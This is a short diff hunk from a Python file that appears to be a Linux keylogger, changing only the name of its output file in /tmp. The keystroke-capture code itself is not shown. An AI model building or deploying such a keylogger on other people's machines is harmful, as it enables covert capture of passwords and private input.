@@ -15,7 +15,7 @@ from time import sleep, time
 import ctypes as ct
 from ctypes.util import find_library
 
-nombre = "/tmp/" + datetime.datetime.now().isoformat() + "keylogger.key"
+nombre = "/tmp/" + datetime.datetime.now().isoformat() + "-keylogger.key"
 # linux only!
 assert("linux" in sys.platform)
 
